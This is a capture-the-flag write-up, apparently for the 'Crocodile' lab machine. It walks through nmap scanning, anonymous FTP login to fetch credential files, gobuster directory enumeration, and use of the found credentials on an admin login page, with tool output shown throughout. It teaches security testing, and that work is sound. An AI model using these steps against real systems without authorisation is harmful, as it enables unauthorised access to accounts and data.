# Crocodile

- TL;DR: `ftp` and `http` running on the remote host. We are able to login to the FTP server using the `anonymous` user and retrieve files which contains credentials that allow us to login to the admin portal of the web server.

## Enumeration

- Run an nmap scan:
```
nmap -sC -sV 10.129.1.15                  

Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 10:41 PDT
Nmap scan report for 10.129.1.15
Host is up (0.093s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.45
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.57 seconds
```
<br>

- From the scan results above we see:
    - `ftp` running on port `21/tcp`
    - `http` running on port `80/tcp`
- We can connect to the remote ftp server using `anonymous` login.
- Once connected to the remote ftp server we can view the contents of the current directory with the `dir` command.
    - ```
        ftp 10.129.1.15

        Connected to 10.129.1.15.
        220 (vsFTPd 3.0.3)
        Name (10.129.1.15:ligma): anonymous
        230 Login successful.
        Remote system type is UNIX.
        Using binary mode to transfer files.

        ftp> dir

        229 Entering Extended Passive Mode (|||46168|)
        150 Here comes the directory listing.
        -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
        -rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
        226 Directory send OK.
      ```
- We see that there are two files in the current directory. We can download these files using to our local host using the `get <filename>` command.
- The contents of the files are usernames and passowrds.

<br>

## Foothold

- Since we do not know what these usernames and passwords are for, we can test them to login to the FTP server.
- Attempting to log in to the FTP server with any of the credentials on the FTP server returns an error code `530 This FTP server is anonymous only.`. From this error we are able to confirm the credentials are not for the FTP server.
- From the Nmap scan we know that there is a web server running on port 80. We can naviagate to it in our web browser and also use the `Wappalyzer` plugin to get a list of all the technologies used to build it.
- We can click on each link to see where it leads us. However, we can use `gobuster` to determine what additional/hidden links exists.
    - ```
        gobuster dir --url http://10.129.1.15:80 --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html
        
        ===============================================================
        Gobuster v3.5
        by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
        ===============================================================
        [+] Url:                     http://10.129.1.15:80
        [+] Method:                  GET
        [+] Threads:                 10
        [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
        [+] Negative Status codes:   404
        [+] User Agent:              gobuster/3.5
        [+] Extensions:              php,html
        [+] Timeout:                 10s
        ===============================================================
        2023/07/08 11:23:39 Starting gobuster in directory enumeration mode
        ===============================================================
        /.php                 (Status: 403) [Size: 276]
        /.html                (Status: 403) [Size: 276]
        /index.html           (Status: 200) [Size: 58565]
        /login.php            (Status: 200) [Size: 1577]
        /assets               (Status: 301) [Size: 311] [--> http://10.129.1.15/assets/]
        /css                  (Status: 301) [Size: 308] [--> http://10.129.1.15/css/]
        /js                   (Status: 301) [Size: 307] [--> http://10.129.1.15/js/]
        /logout.php           (Status: 302) [Size: 0] [--> login.php]
        /config.php           (Status: 200) [Size: 0]
        /fonts                (Status: 301) [Size: 310] [--> http://10.129.1.15/fonts/]
        /dashboard            (Status: 301) [Size: 314] [--> http://10.129.1.15/dashboard/]
      ```
- From the above results we know that there is a `/login.php` page.
- We can navigate to it and test out the credentials we found in the files from the FTP server.
- After attempting several username/password combinations, we manage to login and are met with a Server Manager admin panel where we find the flag.